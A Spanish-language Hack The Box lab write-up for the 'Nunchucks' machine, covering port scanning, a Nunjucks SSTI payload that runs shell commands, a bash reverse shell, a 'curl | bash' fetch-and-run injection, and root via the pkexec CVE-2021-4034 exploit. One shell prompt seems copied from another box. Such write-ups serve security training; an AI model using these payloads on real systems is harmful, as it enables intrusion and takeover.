---
layout: single
title: Nunchucks - Hack The Box
excerpt: "Nunchucks is a easy machine that explores a NodeJS-based Server Side Template Injection (SSTI) leading to an AppArmor bug which disregards the binary&amp;#039;s AppArmor profile while executing scripts that include the shebang of the profiled application.  " 
date: 2024-04-04
classes: wide
header:
  teaser: /assets/images/htb-nunchucks/nunchucks.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - Pkexec
  - SSTI
  - Nunjucks
---

![](/assets/images/htb-nunchucks/nunchucks.png)

Nunchucks is a easy machine that explores a NodeJS-based Server Side Template Injection (SSTI) leading to an AppArmor bug which disregards the binary&amp;#039;s AppArmor profile while executing scripts that include the shebang of the profiled application. 

## Portscan

```
# Nmap 7.94SVN scan initiated Fri Feb 16 16:03:22 2024 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.11.122
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.122 ()	Status: Up
Host: 10.10.11.122 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 443/open/tcp//https///	Ignored State: closed (65532)
# Nmap done at Fri Feb 16 16:03:34 2024 -- 1 IP address (1 host up) scanned in 12.94 seconds

```
Y con esto analizamos los puertos abiertos:
```
# Nmap 7.94SVN scan initiated Fri Feb 16 16:04:20 2024 as: nmap -sCV -p22,80,443 -oN targeted 10.10.11.122
Nmap scan report for 10.10.11.122
Host is up (0.049s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)
|   256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA)
|_  256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://nunchucks.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Nunchucks - Landing Page
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Not valid before: 2021-08-30T15:42:24
|_Not valid after:  2031-08-28T15:42:24
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb 16 16:04:39 2024 -- 1 IP address (1 host up) scanned in 18.62 seconds

```
## Puerto 80

Obtenemos del escaneo de puertos la url de http://nunchucks.htb, asi que vamos a adentrarnos a ver que tiene.

![](/assets/images/htb-nunchucks/pagina1.png)

Analizamos la página y vemos que en esta primera página no se puede hacer nada asi que vamos a buscar subdominios existentes a ver que podemos encontrar:

```
Ricart0@kali:/home/kali/HTB/Nunchucks/nmap -> gobuster vhost --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u https://nunchucks.htb -t 200 -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             https://nunchucks.htb
[+] Method:          GET
[+] Threads:         200
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: store.nunchucks.htb Status: 200 [Size: 4029]
```
Añadimos el dominio a /etc/hosts, y vamos a buscar a ver que encontramos en la página.

## Página web


![](/assets/images/htb-nunchucks/pagina2.png)

Vemos que en esta página se pueden introducir datos y asi buscar alguna debilidad, vamos a introducir {{7*7}}@test.tets a ver si se podría hacer un SSTI. Vemos que nos devuelve 49@test.test y por tanto existe una debilidad SSTI.
Ahora con el burpsuite (intermediario), vamos a jugar a ver si podemos hacer algo. 
"email":"range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()@ola.ola" (el comando entre doble '{')

Vemos que si que nos devuelve el /etc/passwd de la máquina víctima, por tanto podemos ejecutar comandos. 
## Intrusión
Ahora podemos crear un index.html para poder hacer un curl:
```
#!/bin/bash

bash -i >& /dev/tcp/10.10.16.5/443 0>&1

```
Ahora lo compartimos con un servidoe en python3 (python3 -m http.server 80), y nos ponemos en escucha por el puerto 443 (nc -nvlp 443). Y ahora si mandamos un curl que interpretamos con bash.

"email":"range.constructor(\"return global.process.mainModule.require('child_process').execSync('curl 10.10.16.14 | bash')\")()@ola.ola(comando entre doble '{')

Ahora ya estaremos dentro de la máquina víctima. La flag de usuario ya podemos conseguirla. Para que la consola sea totalmente interactiva podemos hacer lo siguiente:
```
script /dev/null -c bash
(Hacemos control+c)
stty raw -echo; fg  
y hacemos reset xterm
```

## Escalada de privilegios

Ahora toca escalar privilegios para obtener la flag de root. Vemos que pkexec se ecuentra otra vez disponible como en muchas de las máquinas, muy vulnerable:
```
strapi@horizontall:~/myapi/config/environments/development$ which pkexec
which pkexec
/usr/bin/pkexec
```
Desde nuestra terminal, vamos a clonarnos este repositorio https://github.com/berdav/CVE-2021-4034 que nos va a escalar el privilegio mediante pkexec, la comprimimos (zip -r comprimido.zip CVE-2021-4034). Desde el equipo de la víctima, obtenemos el zip de nuestro equipo(wget http://10.10.16.6/comprimido.zip). Lo descomprimimos, hacemos make, y lo ejecutamos:
```
david@nunchucks:/tmp/CVE-2021-4034$ ./cve-2021-4034
# cd /root/
# cat root.txt
a5bdba1479e8a34281f6f1d73dcfd804

```
